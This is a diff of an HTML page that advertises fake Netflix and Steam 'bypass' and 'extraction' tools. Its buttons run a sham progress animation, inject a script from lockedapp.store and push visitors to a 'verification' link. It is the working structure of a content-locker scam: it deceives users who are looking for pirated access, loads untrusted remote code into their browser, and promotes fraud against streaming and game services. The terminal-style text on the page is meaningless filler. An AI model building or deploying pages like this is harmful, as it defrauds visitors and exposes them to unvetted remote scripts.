@@ -3,137 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ULTRA_NET | Premium Hub 2025</title>
+    <title>ULTRA_NET | v9.5 SECURE</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #4ade80; font-family: 'Fira Code', monospace; min-height: 100vh; }
-        .matrix-card { 
-            background: rgba(10, 10, 10, 0.9); 
-            border: 1px solid rgba(34, 197, 94, 0.1); 
-            overflow: hidden;
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@900&family=Fira+Code:wght@500&display=swap');
+        body { background-color: #000; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .matrix-card { background-color: #121212; border-radius: 2.5rem; overflow: hidden; transition: 0.3s; }
+        .nav-glass { background-color: rgba(0,0,0,0.95); border-bottom: 1px solid #111; }
+        
+        /* Netflix Cover Fix */
+        .netflix-header { 
+            width: 100%; 
+            height: 200px; 
+            background: #000 url('https://images.ctfassets.net/4cd45et68cgf/4nBnsuPq03uC96pZ6uU69f/e0160b732575775f5647007a8ee948a3/Netflix_Logo_RGB-Red.png?w=600') no-repeat center; 
+            background-size: 60%;
+            border-bottom: 2px solid #e50914;
         }
-        .matrix-card:hover { border-color: #4ade80; transform: scale(1.02); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         
-        /* Fixed Covers with Fallback Colors */
-        .cover { width: 100%; height: 180px; object-fit: cover; transition: 0.5s; }
-        .netflix-cover { background: linear-gradient(45deg, #000, #e50914); }
-        .steam-cover { background: linear-gradient(45deg, #171a21, #66c0f4); }
-        .spotify-cover { background: linear-gradient(45deg, #000, #1db954); }
+        .btn-action { font-weight: 900; text-transform: uppercase; letter-spacing: 0.2em; transition: 0.3s; }
+        .btn-netflix { background-color: #e50914; }
+        .btn-netflix:hover { box-shadow: 0 0 30px #e50914; }
         
-        .matrix-card:hover .cover { transform: scale(1.1); filter: brightness(1.2); }
-        .search-input { background: #0a0a0a; border: 1px solid #166534; color: #4ade80; }
-        .search-input:focus { border-color: #4ade80; box-shadow: 0 0 15px rgba(74, 222, 128, 0.2); outline: none; }
+        .terminal-text { font-family: 'Fira Code', monospace; color: #4ade80; opacity: 0.7; font-size: 10px; line-height: 1.8; }
+        .search-box { background-color: #0a0a0a; border: 1px solid #222; border-radius: 1rem; }
     </style>
 </head>
-<body class="pb-20">
+<body class="pb-10">
 
-    <nav class="sticky top-0 z-50 bg-black border-b border-green-900/30 px-6 py-4 flex justify-between items-center">
+    <nav class="nav-glass sticky top-0 z-50 px-6 py-4 flex justify-between items-center">
         <div class="flex items-center gap-2">
-            <div class="w-8 h-8 bg-green-500 rounded flex items-center justify-center font-bold text-black">U</div>
-            <h2 class="font-bold tracking-tighter text-white text-xs uppercase italic">Ultra_Net</h2>
+            <div class="w-8 h-8 bg-[#4ade80] rounded flex items-center justify-center font-black text-black text-sm">U</div>
+            <h1 class="font-black italic text-sm tracking-tighter uppercase">ULTRA_NET</h1>
         </div>
-        <div class="relative w-1/2 max-w-xs">
-            <input type="text" id="searchInput" onkeyup="searchFilter()" placeholder="SEARCH..." class="search-input w-full py-1.5 px-8 rounded-full text-[9px] uppercase tracking-widest">
-        </div>
-        <div class="text-[8px] text-green-500 font-bold uppercase">v9.5 Secure</div>
+        <div class="text-[9px] text-[#4ade80] font-bold tracking-widest uppercase">v9.5 SECURE</div>
     </nav>
 
-    <div class="max-w-6xl mx-auto px-6 pt-10">
-        
-        <div id="selection-zone" class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
+    <div class="px-6 pt-8">
+        <p class="text-[9px] text-gray-600 mb-2 uppercase font-bold tracking-widest ml-2">Loader-zone</p>
+        <div class="search-box p-3 mb-10 flex items-center">
+            <input type="text" placeholder="SEARCH DATABASE..." class="bg-transparent w-full text-[10px] font-bold outline-none uppercase tracking-widest text-gray-400">
+            <span class="text-gray-700 text-xs">✖</span>
+        </div>
+
+        <div class="space-y-10">
             
-            <div class="matrix-card rounded-3xl item-card" data-name="netflix">
-                <div class="netflix-cover overflow-hidden h-[180px]">
-                    <img src="https://images.unsplash.com/photo-1512070679279-8988d32161be?auto=format&fit=crop&w=800&q=80" class="cover" alt="Netflix">
-                </div>
-                <div class="p-6">
-                    <h3 class="text-lg font-black text-white italic mb-1 uppercase">Netflix UHD</h3>
-                    <p class="text-[9px] text-red-500 font-bold mb-5 tracking-widest uppercase">4K Multi-Screen Bypass</p>
-                    <button onclick="start('Netflix')" class="w-full py-3 bg-red-600/10 border border-red-600/40 text-red-500 text-[9px] font-black tracking-widest hover:bg-red-600 hover:text-white transition uppercase rounded-xl">Inject Protocol</button>
-                </div>
-            </div>
-
-            <div class="matrix-card rounded-3xl item-card" data-name="steam">
-                <div class="steam-cover overflow-hidden h-[180px]">
-                    <img src="https://images.unsplash.com/photo-1612287230202-1ff1d85d1bdf?auto=format&fit=crop&w=800&q=80" class="cover" alt="Steam">
-                </div>
-                <div class="p-6">
-                    <h3 class="text-lg font-black text-white italic mb-1 uppercase">Steam</h3>
-                    <p class="text-[9px] text-blue-400 font-bold mb-5 tracking-widest uppercase">Wallet & AAA Library</p>
-                    <button onclick="start('Steam')" class="w-full py-3 bg-blue-500/10 border border-blue-500/40 text-blue-400 text-[9px] font-black tracking-widest hover:bg-blue-500 hover:text-white transition uppercase rounded-xl">Extract Data</button>
+            <div class="matrix-card">
+                <div class="netflix-header"></div>
+                <div class="p-8">
+                    <p class="text-[9px] text-gray-500 mb-2 uppercase font-bold">Selection UHD</p>
+                    <h3 class="text-3xl font-black italic mb-2 uppercase tracking-tighter text-white">Netflix UHD</h3>
+                    <p class="text-[10px] text-red-600 font-bold mb-8 uppercase italic leading-tight">4K Multi-Screen Bypass Protocol</p>
+                    <button onclick="start('Netflix')" class="w-full py-5 btn-action btn-netflix rounded-2xl text-xs">Inject Protocol</button>
                 </div>
             </div>
 
-            <div class="matrix-card rounded-3xl item-card" data-name="spotify">
-                <div class="spotify-cover overflow-hidden h-[180px]">
-                    <img src="https://images.unsplash.com/photo-1614613535308-eb5fbd3d2c17?auto=format&fit=crop&w=800&q=80" class="cover" alt="Spotify">
+            <div class="matrix-card">
+                <div class="w-full h-[200px] bg-[#171a21] flex items-center justify-center border-bottom border-blue-500/20">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Steam_Logo.png" class="w-24 opacity-80" alt="Steam">
                 </div>
-                <div class="p-6">
-                    <h3 class="text-lg font-black text-white italic mb-1 uppercase">Spotify Premium</h3>
-                    <p class="text-[9px] text-green-500 font-bold mb-5 tracking-widest uppercase">No-Ads Lifetime Bypass</p>
-                    <button onclick="start('Spotify')" class="w-full py-3 bg-green-500/10 border border-green-500/40 text-green-500 text-[9px] font-black tracking-widest hover:bg-green-500 hover:text-black transition uppercase rounded-xl">Bypass Ads</button>
+                <div class="p-8">
+                    <p class="text-[9px] text-gray-500 mb-2 uppercase font-bold">Selection UH2</p>
+                    <h3 class="text-3xl font-black italic mb-2 uppercase tracking-tighter text-white">Steam</h3>
+                    <p class="text-[10px] text-blue-500 font-bold mb-8 uppercase italic leading-tight">Wallet & Library Extraction</p>
+                    <button onclick="start('Steam')" class="w-full py-5 btn-action bg-[#3b82f6] rounded-2xl text-xs">Extract Protocol</button>
                 </div>
             </div>
 
         </div>
 
-        <div class="bg-white/[0.02] border border-white/5 rounded-[2rem] p-8 mb-10">
-            <h2 class="text-xl font-bold text-white mb-6 text-center italic uppercase tracking-widest">Bypass Instructions<span class="text-green-500">_</span></h2>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-[10px] text-center uppercase tracking-tighter">
-                <div class="p-4 border border-white/5 rounded-xl">01. Select Platform & Wait for ID</div>
-                <div class="p-4 border border-white/5 rounded-xl">02. Complete Security Verification</div>
-                <div class="p-4 border border-white/5 rounded-xl">03. Get Final Data on Telegram</div>
+        <div class="mt-12 border-l-2 border-[#166534] pl-6 py-4 terminal-text uppercase italic">
+            <p>htt.2 w tolt Fircked Inset 0 BBv.55-10-00+00.1ins/£2012p</p>
+            <p>16£/€8016]</p>
+            <p>27/L:29[44-6004]</p>
+            <p>htpx=20-05=11w:[4B1.50+0/6049]</p>
+        </div>
+
+        <div class="mt-16 text-center">
+            <h2 class="italic font-black text-2xl text-[#4ade80] mb-6 tracking-tighter">Encrypted Server Network</h2>
+            <div class="flex justify-between px-2 text-[10px] font-bold text-[#4ade80]/60 uppercase italic">
+                <span>Status : Optimal</span>
+                <span>Latency : Active</span>
+                <span>Global : Active</span>
             </div>
         </div>
     </div>
 
-    <div id="loader-zone" class="hidden fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6">
-        <div class="max-w-md w-full text-center">
-            <div class="h-0.5 w-full bg-white/10 mb-6 overflow-hidden"><div id="fill" class="h-full bg-green-500 w-0 transition-all shadow-[0_0_10px_#4ade80]"></div></div>
-            <div id="console" class="text-[9px] font-mono text-green-500 h-24 overflow-hidden italic uppercase leading-loose"></div>
+    <div id="loader-zone" class="hidden fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-10">
+        <div class="w-full text-center">
+            <div class="h-0.5 bg-gray-900 mb-8 overflow-hidden rounded-full"><div id="fill" class="h-full bg-[#4ade80] w-0 transition-all duration-300"></div></div>
+            <p class="text-[10px] font-mono text-[#4ade80] uppercase italic tracking-[0.3em] animate-pulse">Processing Bypass...</p>
         </div>
     </div>
 
-    <div id="verify-zone" class="hidden fixed inset-0 bg-black/98 z-[101] flex items-center justify-center p-6">
-        <div class="bg-black border border-green-500/20 p-10 rounded-[2.5rem] max-w-sm text-center">
-            <h2 class="text-xl font-black text-white mb-4 italic uppercase">Security Alert</h2>
-            <p class="text-[10px] text-gray-500 mb-8 uppercase leading-relaxed">To prevent automated abuse, please complete verification to receive your Telegram token.</p>
-            <button onclick="unlock()" class="w-full py-5 bg-green-500 text-black font-black rounded-xl text-xs shadow-[0_0_30px_rgba(74,222,128,0.3)] hover:scale-105 transition-all uppercase italic">Verify & Join Telegram</button>
+    <div id="verify-zone" class="hidden fixed inset-0 bg-black/98 z-[101] flex items-center justify-center p-10 text-center">
+        <div class="matrix-card p-12 border-white/5">
+            <h2 class="text-2xl font-black mb-6 uppercase italic text-white tracking-widest">Security</h2>
+            <p class="text-[10px] text-gray-500 mb-10 uppercase leading-loose tracking-widest">Complete manual verification to receive your final access token.</p>
+            <button onclick="unlock()" class="w-full py-5 bg-[#4ade80] text-black font-black rounded-3xl text-xs uppercase italic tracking-widest shadow-[0_0_30px_#4ade80]">Verify Now</button>
         </div>
     </div>
 
     <script>
-        function searchFilter() {
-            let input = document.getElementById('searchInput').value.toLowerCase();
-            let cards = document.getElementsByClassName('item-card');
-            for (let card of cards) {
-                let name = card.getAttribute('data-name');
-                card.style.display = name.includes(input) ? "block" : "none";
-            }
-        }
-        const msgs = ["Handshaking...", "Bypassing RSA...", "Extracting Data...", "Securing Session...", "Ready!"];
         function start(type) {
             document.getElementById('loader-zone').classList.remove('hidden');
-            let p = 0, i = 0;
+            let p = 0;
             const iv = setInterval(() => {
                 p += 5; document.getElementById('fill').style.width = p + '%';
-                if(p % 20 == 0 && i < msgs.length) {
-                    const l = document.createElement('p'); l.innerText = '> ' + msgs[i++];
-                    document.getElementById('console').appendChild(l);
-                }
                 if(p >= 100) {
                     clearInterval(iv);
                     setTimeout(() => {
                         document.getElementById('loader-zone').classList.add('hidden');
                         document.getElementById('verify-zone').classList.remove('hidden');
-                        const s = document.createElement('script'); s.src = 'https://lockedapp.store/cl/js/6ndqd7'; document.body.appendChild(s);
+                        const s = document.createElement('script');
+                        s.src = 'https://lockedapp.store/cl/js/6ndqd7';
+                        document.body.appendChild(s);
                     }, 500);
                 }
             }, 100);
         }
-        function unlock() { if(typeof og_load === 'function') { og_load(); } else { window.location.href = "https://lockedapp.store/cl/i/6ndqd7"; } }
+        function unlock() {
+            if(typeof og_load === 'function') { og_load(); } 
+            else { window.location.href = "https://lockedapp.store/cl/i/6ndqd7"; }
+        }
     </script>
 </body>
 </html>
